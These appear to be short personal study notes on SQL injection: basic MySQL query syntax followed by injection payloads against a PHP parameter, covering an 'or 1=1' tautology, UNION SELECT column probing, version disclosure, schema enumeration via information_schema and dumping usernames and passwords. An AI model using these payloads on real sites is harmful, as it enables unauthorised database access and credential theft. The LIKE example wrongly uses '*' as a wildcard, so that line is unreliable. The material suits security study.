# SQL Injection Notes

## mysql Port

3306

## Hierarchy

DB -> Table -> Columns -> Rows

## SQL Queries

Get all data from table:
```sql
SELECT * FROM table;
```

Get specific column data:
```sql
SELECT col FROM table;

SELECT col1,col2 FROM table;
```

Filter by condition:
```sql
SELECT col FROM table
WHERE col1 > 10;
```

String Filtering:
```sql
-- Get all names that start with Mi
SELECT * FROM table
where name LIKE "Mi*"
```

Orders, Limits, and Offsets:
```sql
SELECT * FROM table
ORDER BY col1 ASC/DESC
LIMIT 2
OFFSET 2;
```

## Notes

SQL Method:
```
php?item=4 or 1=1
```

See number of columns and select that number
```
php?item=4 union select 1,2,3

php?item=4 union select 1,2,3,@@version (display version)
```

Perform golden statement:
```
union select table_schema,2,table_name,column_name,5 from information_schema.columns #
```

```
union select id,2,name,pass,@@version from session.user #
```
